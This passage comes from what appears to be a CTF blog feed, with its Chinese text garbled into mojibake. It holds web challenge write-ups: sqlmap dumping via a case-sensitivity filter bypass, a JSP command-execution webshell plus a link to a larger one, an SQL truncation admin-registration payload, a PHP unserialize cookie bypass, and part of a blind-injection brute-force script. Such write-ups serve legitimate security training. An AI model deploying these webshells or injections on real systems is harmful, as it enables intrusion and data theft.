class="string">"json.php"</span>,<span class="attr">type</span>:<span class="string">'post'</span>,<span class="attr">data</span>:&#123;<span class="string">'id'</span>:id&#125;,<span class="attr">success</span>:<span class="function"><span class="keyword">function</span>(<span class="params">d</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> data = <span class="built_in">eval</span>(<span class="string">'('</span> +d +<span class="string">')'</span>);</span><br><span class="line"><span class="keyword">if</span>(data[<span class="string">'id'</span>] !=<span class="string">'undefined'</span> ||data[<span class="string">'id'</span>] !=<span class="string">""</span> ||data[<span class="string">'id'</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">alert(<span class="string">'ç”¨æˆ·åå·²å­˜åœ¨!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>ä»”ç»†æŸ¥çœ‹ä»£ç å‘ç°å­˜åœ¨<code>json.php</code>è¿˜æœ‰postä¸€ä¸ªidå‚æ•°ï¼Œåˆ°åé¢çœ‹äº†è§£é¢˜çš„è§†é¢‘å‘ç°å…¶å®è¿™é‡Œè¿˜èƒ½ç”¨getæ–¹å¼ä¼ å‚ï¼Œæˆ‘ä»¬å°±è¿›å»json.phpé¡µé¢æŸ¥çœ‹ä¸€ä¸‹ï¼Œç«Ÿç„¶é¢˜ç›®è¯´äº†è¦adminå°±ä¼ ä¸€ä¸ªadminè¿›å»ï¼Œå‘ç°æœ‰å›æ˜¾<code>{&#39;id&#39;:&#39;1&#39;,&#39;title&#39;:&#39;admin&#39;}</code>ï¼Œå°è¯•ä¸€ä¸‹æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥æ¼æ´ï¼Œåœ¨å°è¯•åŒå¼•å·çš„æ—¶å€™å‘ç°æœ‰æŠ¥é”™ä¿¡æ¯ï¼Œç„¶åè¯¦ç»†ä¸€ç‚¹æµ‹è¯•<code>json.php?id=admin&quot; or 1=1%23</code>,å‘ç°æœ‰æ£€æµ‹ï¼Œè¿™å°±å¾ˆå°¬ï¼Œåæ¥è¿˜æ˜¯çœ‹äº†è§†é¢‘æ‰çŸ¥é“æ˜¯ä»å¤´éƒ¨ä¿¡æ¯å“ªé‡Œå‘ç°çš„æœåŠ¡å™¨æ˜¯<code>Windows</code>çš„ï¼Œè¿™æ ·å°±å¯ä»¥ç”¨Windowsçš„å¤§å°å†™ç‰¹æ€§å»ç»•è¿‡ï¼Œå°±å¯ä»¥å°è¯•ä¸€ä¸‹<code>json.phP?id=admin&quot; or 1=1%23</code>ï¼Œé‡æ–°å›æ˜¾<code>{&#39;id&#39;:&#39;1&#39;,&#39;title&#39;:&#39;admin&#39;}</code>ï¼Œè¿™å°±å¯ä»¥æ…¢æ…¢æ³¨å…¥äº†å•Šï¼Œæ¥ä¸‹æ¥å°±æ˜¯sqlmapä¸€æŠŠè¿‡å°±è¡Œã€‚ã€‚ã€‚ã€‚è¯´å®è¯æˆ‘æ˜¯çœŸæƒ³ä¸åˆ°ï¼Œè¿˜æ˜¯è¦è™šå¿ƒå­¦ä¹ å•Š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://101.71.29.5:10006/json.Php?id=admin&quot;  --threads 10 -D 5monthweb -T article -C content --dump</span><br></pre></td></tr></table></figure><p>æœ€åå¾—åˆ°ç»“æœ<br><img src="https://s1.ax1x.com/2018/05/24/CWrves.png" alt="CWrves.png"></p><h2 id="ä¸€ä¸ªhackeroneçš„æœ‰è¶£çš„æ¼æ´çš„å¤ç°çš„é¢˜ç›®"><a href="#ä¸€ä¸ªhackeroneçš„æœ‰è¶£çš„æ¼æ´çš„å¤ç°çš„é¢˜ç›®" class="headerlink" title="ä¸€ä¸ªhackeroneçš„æœ‰è¶£çš„æ¼æ´çš„å¤ç°çš„é¢˜ç›®"></a>ä¸€ä¸ªhackeroneçš„æœ‰è¶£çš„æ¼æ´çš„å¤ç°çš„é¢˜ç›®</h2><p>è¿™é¢˜è€ƒäº†.gitæºç æ³„éœ²ï¼ŒæŠŠæºç æ‹¿ä¸‹æ¥ä»¥åæ‰“ç®—ç¬¬äºŒå¤©åšã€‚ã€‚ã€‚è¿™ä¸ªé¢˜ç›®ç¬¬äºŒå¤©åšçš„æ—¶å€™å› ä¸ºå¹³å°ç»´æŠ¤ä¸èƒ½å¤ç°äº†ï¼Œä¸‹æ¬¡è¿˜æ˜¯æ—©ç‚¹åšå§ã€‚ã€‚è¿˜å¾—ç»§ç»­åŠªåŠ›ã€‚ã€‚ã€‚ã€‚ã€‚</p><p><img src="https://s1.ax1x.com/2018/05/24/CWrzoq.png" alt="CWrzoq.png"></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>cumt2018æ ¡èµ›éƒ¨åˆ†write up</title>
      <link href="/cumt-2018-final.html"/>
      <url>/cumt-2018-final.html</url>
      <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å› ä¸ºä¸Šå­¦æœŸè¿›å…¥äº†å†³èµ›ï¼Œäºæ˜¯åœ¨ä¸Šå‘¨å…­è¿›è¡Œäº†å†³èµ›ï¼Œæ„Ÿè§‰è‡ªå·±è¿˜æ˜¯å¤ªæ¸£ï¼Œæœ€ååªèƒ½è·Ÿé˜Ÿå‹åšäº†ä¸¤é“é¢˜ç›®æ‹¿äº†ä¸ªä¸‰ç­‰å¥–ï¼Œè¿˜æ˜¯è®°å½•ä¸€ä¸‹è§£é¢˜è¿‡ç¨‹å§</p><a id="more"></a><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><h3 id="Jerryâ€™s-Site-1"><a href="#Jerryâ€™s-Site-1" class="headerlink" title="Jerryâ€™s Site 1"></a>Jerryâ€™s Site 1</h3><p>è¿™ä¸ªé¢˜ç›®ä¸€å¼€å§‹å¿˜äº†æ‰«åå°ç›®å½•ï¼Œç›´åˆ°æœ‰äº†hintå­˜åœ¨<code>adminåå°</code>å¹¶ä¸”å­˜åœ¨å¼±å£ä»¤æ‰å¼€å§‹è§£å†³è¿™é“é¢˜ç›®äº†ï¼Œä»¥åæ²¡æ€è·¯çš„æ—¶å€™è¿˜æ˜¯è¦æ‰«æä¸€æ³¢åå°å•Šã€‚ã€‚ã€‚è¯´ä¸å®šå°±æœ‰ç‰¹åˆ«çš„å‘ç°äº†å•Š<br>æ ¹æ®å¼±å£ä»¤ï¼Œå°è¯•ç”¨æˆ·åå¯†ç éƒ½æ˜¯<code>admin</code>è¿›å…¥åå°</p><p><img src="https://s1.ax1x.com/2018/05/21/C2cVOJ.jpg" alt="C2cVOJ.jpg"><br>éšä¾¿ç‚¹ç‚¹ï¼Œå‘ç°æœ‰ä¸ªåœ°æ–¹æœ‰ç‚¹æ„æ€ï¼Œå¯ä»¥å¢åŠ æ–‡ä»¶ï¼Œå°±æ˜¯æ–‡ä»¶ç®¡ç†æ¨¡å—ï¼Œä½†æ˜¯å½“æ—¶å¯èƒ½è¿ç»´å‡ºäº†ç‚¹é—®é¢˜ï¼Œæ²¡æœ‰å¼€å†™æƒé™ï¼Œæ‰€ä»¥å¡ä½äº†å¾ˆä¹…ï¼Œåæ¥é¢˜ç›®æ¢å¤äº†å°±ä¸å­˜åœ¨é—®é¢˜äº†ã€‚ã€‚ã€‚<br><img src="https://s1.ax1x.com/2018/05/21/C2cem9.jpg" alt="C2cem9.jpg"></p><p>å› ä¸ºè¿™ä¸ªé¢˜ç›®æŠ“åŒ…å‘ç°æ˜¯<code>Tomcat</code>æœåŠ¡å™¨ï¼Œæƒ³åˆ°äº†ä¸Šä¸€æ¬¡æŸæŸæ¯æ¯”èµ›é‡Œé¢ä¸€é“ç±»ä¼¼çš„ä¸Šä¼ æ–‡ä»¶çš„é¢˜ç›®<br>æ‰€ä»¥æƒ³åˆ°<code>Tomcat</code>å°±ä¼šæƒ³åˆ°è¿™æ˜¯<code>Java</code>å†™çš„ç½‘ç«™ï¼Œäºæ˜¯å°±ä¸Šç½‘æ‰¾<code>jspæœ¨é©¬</code></p><p>è¿™é‡Œæ”¾ä¸Šå½“æ—¶æˆ‘ä¸Šä¼ çš„jspå¤§é©¬<br><a href="https://raw.githubusercontent.com/tennc/webshell/master/jsp/JFolder.jsp" target="_blank" rel="noopener">https://raw.githubusercontent.com/tennc/webshell/master/jsp/JFolder.jsp</a></p><p>ç„¶åè®¿é—®æœ¨é©¬æ–‡ä»¶ï¼Œåœ¨ä¸Šå±‚ç›®å½•å¯ä»¥æ‰¾<code>flag.txt</code>ï¼Œä¸‹è½½ä¸‹æ¥æ‰“å¼€å³å¯</p><p>å½“ç„¶ä¹Ÿå¯ä»¥æ‰¾å°é©¬<br><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">"023"</span>.equals(request.getParameter(<span class="string">"pwd"</span>)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(<span class="string">"i"</span>)).getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">"&lt;pre&gt;"</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">"&lt;/pre&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></p><p>hackbaré‡Œé¢æ‰§è¡Œ<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://jerry.bxsteam.xyz/cms/sky.jsp?pwd=023&amp;i=ls</span><br></pre></td></tr></table></figure></p><p>å‘ç°åŒæ ·å‘ç°<code>flag.txt</code>ï¼Œ<code>cat</code>ä¸€æ³¢å³å¯ã€‚ã€‚ã€‚</p><p>å¾—åˆ°flag<br><code>cumtctf{thi3_1s_first_F4l9_in_thi_web}</code></p><h3 id="ezsqli"><a href="#ezsqli" class="headerlink" title="ezsqli"></a>ezsqli</h3><p>è¿™ä¸€é“é¢˜ç›®å®Œå…¨è¢«æç¤ºå¸¦åï¼Œè¯´æ˜¯äºŒæ¬¡æ³¨å…¥ï¼Œç›´æ¥è¯´æ˜¯<code>SQLé•¿åº¦çº¦æŸæ”»å‡»</code>ä¸å°±å¥½äº†ã€‚ã€‚ã€‚ã€‚-_-||ï¼Œè¿™ä¸ªé¢˜ç›®æ‰‹é€Ÿå¿«ä¸€ç‚¹å¯èƒ½å°±æœ‰äºŒç­‰å¥–äº†<br>åæ¥ä»”ç»†æƒ³æƒ³ï¼Œå…¶å®å§è¿™ä¹Ÿç®—æ˜¯sqläºŒæ¬¡æ³¨å…¥çš„ä¸€ç§ã€‚ã€‚ã€‚ç»è¿‡æˆªæ–­åå†æ”¾è¿›æ•°æ®åº“é‡Œé¢æœç´¢ã€‚ã€‚emmm</p><p>ä»¥å‰åœ¨bugkuå¹³å°ä¸Šåšè¿‡ä¸€é“ç±»ä¼¼çš„é¢˜ç›®</p><p>ç›´æ¥åœ¨æ³¨å†Œé¡µé¢ä¸Šæ³¨å†Œä¸‹é¢çš„å†…å®¹<br>æˆ‘çš„payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:admin                                                       &apos;</span><br><span class="line">password:123</span><br></pre></td></tr></table></figure><p>æ³¨æ„payloadé‡Œé¢çš„å¦‚ä½•åˆ©ç”¨ç©ºæ ¼å»æˆªæ–­</p><p>æ³¨å†Œå®Œåè·³è½¬åˆ°ç™»å½•é¡µé¢ï¼Œæ­¤æ—¶ä½ å°±æ˜¯<code>admin</code>ç”¨æˆ·äº†ã€‚ã€‚ã€‚<br>ç‚¹å‡»ä¸‹é¢éšæ„ä¸€ä¸ªé“¾æ¥ï¼Œå¾—åˆ°flag</p><p>Â·cumtctf{easy_injection_for_fun}Â·</p><p>##ç»“è¯­<br>å¸Œæœ›ä»¥åæ…¢æ…¢è¿›æ­¥ï¼Œå˜å¾—æ›´å¼ºå§ã€‚ã€‚<br>å¤§ä½¬ä»¬ä»¥åè½»ç‚¹è™ã€‚ã€‚ã€‚æˆ‘è¿›æ­¥å¾—å¤ªæ…¢ã€‚ã€‚ã€‚</p><p>webçš„å…¨éƒ¨wp:<a href="http://skysec.top/2018/05/19/2018CUMTCTF-Final-Web/" target="_blank" rel="noopener">http://skysec.top/2018/05/19/2018CUMTCTF-Final-Web/</a></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>WhaleCTFç¬¬äºŒæœŸæ‰“å¡çš„webé¢˜</title>
      <link href="/whalectf-web2.html"/>
      <url>/whalectf-web2.html</url>
      <content type="html"><![CDATA[<p>æŠŠå‰©ä¸‹çš„å‡ ä¸ªwebé¢˜ç›®å®Œæˆè®°å½•ä¸€ä¸‹<a id="more"></a>å§ã€‚</p><h3 id="ç™»å½•æ— æ•ˆ"><a href="#ç™»å½•æ— æ•ˆ" class="headerlink" title="ç™»å½•æ— æ•ˆ"></a>ç™»å½•æ— æ•ˆ</h3><p>è¿™ä¸€é¢˜å¥½åƒæ˜¯bugkuçš„åŸé¢˜ï¼Œå°±æ˜¯ä¸€ä¸ªååºåˆ—åŒ–çš„é¢˜ç›®ï¼ŒæŸ¥çœ‹æºç å‘ç°æœ‰æç¤ºï¼Œå¯¹åº”è¾“å…¥ä¸€ä¸ªhintå‚æ•°ï¼Œå‘ç°æºç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line"></span><br><span class="line">include_once(&quot;flag.php&quot;); </span><br><span class="line"></span><br><span class="line">$cookie = $_COOKIE[&apos;Whale&apos;]; </span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;hint&apos;]))&#123; </span><br><span class="line">    show_source(__FILE__); </span><br><span class="line">&#125; </span><br><span class="line">elseif (unserialize($cookie) === &quot;$KEY&quot;) </span><br><span class="line">&#123;    </span><br><span class="line">    echo &quot;$flag&quot;; </span><br><span class="line">&#125; </span><br><span class="line">else &#123; </span><br><span class="line">?&gt; </span><br><span class="line">&lt;html&gt; </span><br><span class="line"></span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; </span><br><span class="line">&lt;title&gt;Login&lt;/title&gt; </span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;admin.css&quot; type=&quot;text/css&quot;&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line"></span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;br&gt; </span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;container&quot; align=&quot;center&quot;&gt; </span><br><span class="line">  &lt;form method=&quot;POST&quot; action=&quot;#&quot;&gt; </span><br><span class="line">    &lt;p&gt;&lt;input name=&quot;user&quot; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;&lt;/p&gt; </span><br><span class="line">    &lt;p&gt;&lt;input name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;/p&gt; </span><br><span class="line">    &lt;p&gt;&lt;input value=&quot;Login&quot; type=&quot;button&quot;/&gt;&lt;/p&gt; </span><br><span class="line">  &lt;/form&gt; </span><br><span class="line">&lt;!--hint:paramenter:hint--&gt; </span><br><span class="line">&lt;/div&gt; </span><br><span class="line"></span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt; </span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">&#125; </span><br><span class="line">$KEY=&apos;Whale:www.whalectf.com&apos;; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¢åœ¨æ„çš„å°±æ˜¯å­˜åœ¨unserializeå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ååºåˆ—åŒ–ï¼Œç®€å•è¯´ä¸€ä¸‹ä»£ç çš„æµç¨‹ï¼Œååºåˆ—åŒ–cookieå€¼ï¼Œåªè¦ä½¿å¾—cookieå€¼ç­‰äºkeyçš„å€¼å°±å¯ä»¥äº†ï¼Œä½†æ˜¯è¿™é‡Œçš„keyå¾—æ³¨æ„ä¸€ä¸‹ï¼Œè¿™é‡Œçš„keyå€¼ä¸€å¼€å§‹æ˜¯ç­‰äºNULLçš„ï¼Œä»–æ˜¯åˆ°åé¢æ‰ç»™KEYèµ‹å€¼çš„ï¼Œè€Œä¸”è¿™é¢˜éš¾åº¦å¤§å¤§é™ä½äº†ï¼Œä¸æ˜¯ä»¥ç±»çš„æ–¹å¼æ¥å®ç°ååºåˆ—åŒ–çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure><p>è®¾ç½®cookieï¼Œç›´æ¥å¾—åˆ°flag</p><p><img src="https://s2.ax1x.com/2019/02/03/kGouvj.png" alt="kGouvj.png"></p><h3 id="çå­æ‘¸é±¼"><a href="#çå­æ‘¸é±¼" class="headerlink" title="çå­æ‘¸é±¼"></a>çå­æ‘¸é±¼</h3><p>æŸ¥çœ‹æºç æŸ¥çœ‹å¤´å‘ç°æ²¡ä»€ä¹ˆå¯ä»¥åˆ©ç”¨äº†çš„äºæ˜¯å°±æŸ¥æ‰¾ä¸€ä¸‹æ˜¯å¦æºç æ³„éœ²ï¼Œç”¨dirsearchæœä¸€æ³¢ï¼Œå‘ç°é‡Œé¢æœ‰å‡ ä¸ªé¡µé¢æ˜¯å­˜åœ¨çš„ï¼Œå‰é¢ä¸¤ä¸ªæ˜¯ä¸€æ ·çš„é¡µé¢ï¼Œæœ‰ç”¨çš„é¡µé¢æ˜¯æœ€åä¸€ä¸ª</p><p><img src="https://s2.ax1x.com/2019/02/03/kGoQrn.png" alt="kGoQrn.png"></p><p>åœ¨index.php~é‡Œé¢å‘ç°å¯¹åº”é…ç½®æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   $dbhost = <span class="string">"localhost"</span>;</span><br><span class="line">   $dbuser = <span class="string">"root"</span>;</span><br><span class="line">   $dbpass = <span class="string">"123456"</span>;</span><br><span class="line">   $db = <span class="string">"ctf"</span>;</span><br><span class="line">   $conn = mysqli_connect($dbhost,$dbuser,$dbpass,$db);</span><br><span class="line">   mysqli_set_charset($conn,<span class="string">"utf8"</span>);</span><br><span class="line">  </span><br><span class="line">   <span class="comment">/* sql</span></span><br><span class="line"><span class="comment">  </span></span><br><span class="line"><span class="comment">      create  table `admin` (</span></span><br><span class="line"><span class="comment">         `id` int(10) not null primary key auto_increment,</span></span><br><span class="line"><span class="comment">         `username` varchar(20) not null ,</span></span><br><span class="line"><span class="comment">         `password` varchar(32) not null</span></span><br><span class="line"><span class="comment">      );</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span>   <span class="title">filter</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">       $filterlist = <span class="string">"/\(|\)|username|password|where|</span></span><br><span class="line"><span class="string">       case|when|like|regexp|into|limit|=|for|;/"</span>;</span><br><span class="line">       <span class="keyword">if</span>(preg_match($filterlist,strtolower($str)))&#123;</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">"illegal input!"</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> $str;</span><br><span class="line">   &#125;</span><br><span class="line"> $username = <span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])?</span><br><span class="line"> filter($_POST[<span class="string">'username'</span>]):<span class="keyword">die</span>(<span class="string">"please input username!"</span>);</span><br><span class="line"> $password = <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])?</span><br><span class="line"> filter($_POST[<span class="string">'password'</span>]):<span class="keyword">die</span>(<span class="string">"please input password!"</span>);</span><br><span class="line"> $sql = <span class="string">"select * from admin where  username =</span></span><br><span class="line"><span class="string">  '$username' and password = '$password' "</span>;</span><br><span class="line">  </span><br><span class="line"> $res = $conn -&gt; query($sql);</span><br><span class="line"> <span class="keyword">if</span>($res-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">   $row = $res -&gt; fetch_assoc();</span><br><span class="line">   <span class="keyword">if</span>($row[<span class="string">'id'</span>])&#123;</span><br><span class="line">      <span class="keyword">echo</span> $row[<span class="string">'username'</span>];</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"The content in the password column is the flag!"</span>;</span><br><span class="line"> &#125;</span><br><span class="line">  </span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä»ä¸Šé¢çš„ä»£ç å¯ä»¥å¾—åˆ°çš„ä¿¡æ¯æœ‰æ•°æ®åº“é‡Œé¢çš„å­—æ®µæ•°æœ‰ä¸‰ä¸ªï¼Œè¿˜æœ‰ä»–çš„è¿‡æ»¤å­—æ®µï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹ä»–çš„æ‰§è¡Œæµç¨‹ï¼Œåˆ†åˆ«ç”¨POSTå‚æ•°è·å–usernameå’Œpasswordå‚æ•°ï¼Œç„¶åç»è¿‡è¿‡æ»¤ï¼Œä»æ•°æ®åº“ä¸­è·å–ä¸€ç»„æ•°æ®ï¼Œæœ‰æ•°æ®å°±æ˜¾ç¤ºç”¨æˆ·åï¼Œæœ€åä¸€å¥å¯ä»¥çœ‹è§flagå°±æ˜¯password</p><p>è¿™ä¸ªè¿‡æ»¤æœ‰ä¸¤ä¸ªç‚¹éœ€è¦æ³¨æ„ä¸€ä¸‹</p><p>æ²¡æœ‰äº†æ‹¬å·å°±ä¸èƒ½ç”¨sqlé‡Œé¢çš„è¯­å¥äº†,æ²¡æœ‰äº†passwordï¼Œä½†æ˜¯ä»–å´æ˜¯å­—æ®µåï¼Œæ‰€ä»¥SQLè¯­å¥é‡Œé¢å¹¶ä¸èƒ½å‡ºç°passwordè¿™ä¸ªåˆ—å</p><p>è¿™é‡Œç”¨åˆ°ä¸€ä¸ªunionç›²æ³¨çš„çŸ¥è¯†ç‚¹</p><p>å› ä¸ºè¿™é‡ŒMySQLçš„å­—ç¬¦ä¸²æ’åºæ˜¯ä»å¤´å¼€å§‹ä¸€ä¸ªä¸ªASCIIç å»æ¯”è¾ƒçš„ï¼Œå› æ­¤ä¼šæœ‰ä¸‹é¢çš„ç»“æœ</p><p><img src="https://s2.ax1x.com/2019/02/03/kGo3V0.png" alt="kGo3V0.png"></p><p> order by 3æ˜¯ä»¥ç¬¬ä¸‰åˆ—ä½œä¸ºæ’åºï¼Œç„¶ådistinctå»æ‰é‡å¤çš„åå­—ï¼Œdescæ˜¯é™åºæ’åºï¼Œé»˜è®¤æ˜¯å‡åºï¼Œä¹Ÿå°±æ˜¯å°çš„åœ¨ä¸‹é¢å¤§çš„åœ¨ä¸Šé¢ï¼Œå¯ä»¥åˆ©ç”¨ç›²æ³¨å»çˆ†ç ´å‡ºå¯†ç ï¼Œè¿™é‡Œæˆ‘æ˜¯ä»ASCIIç å¢å¤§çš„æƒ…å†µè€ƒè™‘ä¹Ÿå°±æ˜¯(48,127)æ¯”ä»–å¤§äº†å°±å‡ä¸€å°±å¯¹åº”çš„ASCIIç ,ä¹Ÿå°±æ˜¯è¯´é›¶ç•Œç‚¹æ˜¯å‡ä¸€çš„æ—¶å€™</p><p><img src="https://s2.ax1x.com/2019/02/03/kGoYPU.png" alt="kGoYPU.png"></p><p>å½“ç„¶æˆ‘ä»¬å¯ä»¥å‡åºå»çˆ†ç ´,å°±æŠŠç¬¦å·å­—å…¸å€’åºè¿‡æ¥å³å¯ï¼Œé›¶ç•Œç‚¹åˆšå¥½æ˜¯ä¸å‡ºç°ç”¨æˆ·åçš„æ—¶å€™ï¼Œè¿™é‡Œçš„ç›²æ³¨æ˜¯ä¸€å¼€å§‹å°±çŸ¥é“ç”¨æˆ·åçš„ï¼Œæˆ‘ä»¬éœ€è¦è·å–å¯¹åº”çš„ç”¨æˆ·åï¼Œæ€ä¹ˆè·å–ï¼Œå¯ä»¥åˆ©ç”¨ä¸€ä¸ªå¼‚æˆ–å»è·å–å¯¹åº”çš„ç”¨æˆ·åï¼Œå½“ç„¶è¿™é‡Œé™¤äº†^0,è¿˜å¯ä»¥æ˜¯^1^1ï¼Œä¼šå°†æ•°æ®åº“æ‰€æœ‰ç»“æœéƒ½ä¼šè¿”å›çš„ã€‚</p><p><img src="https://s2.ax1x.com/2019/02/03/kGoN24.png" alt="kGoN24.png"></p><p>å‘åŒ…å¯ä»¥è·å–å¾—åˆ°å¯¹åº”çš„ç”¨æˆ·å</p><p><img src="https://s2.ax1x.com/2019/02/03/kGoUxJ.png" alt="kGoUxJ.png"></p><p>ä¸‹é¢å°±æ˜¯æ‰§è¡Œçˆ†ç ´çš„è„šæœ¬ï¼Œå°±æ˜¯åˆ©ç”¨pythonå­—ç¬¦ä¸²çš„formatæ¥å®ç°ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯å‡åºçˆ†ç ´ï¼Œæ‰€ä»¥æˆ‘åœ¨æ„é€ å­—å…¸çš„æ—¶å€™ä½¿ç”¨äº†ä¸€ä¸ªå­—ç¬¦ä¸²åˆ‡ç‰‡é€†åºå­—ç¬¦ä¸²ï¼Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makeStr</span><span class="params">(begin,end)</span>:</span></span><br><span class="line">ss = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(begin,end):</span><br><span class="line">ss = ss+ chr(i)</span><br><span 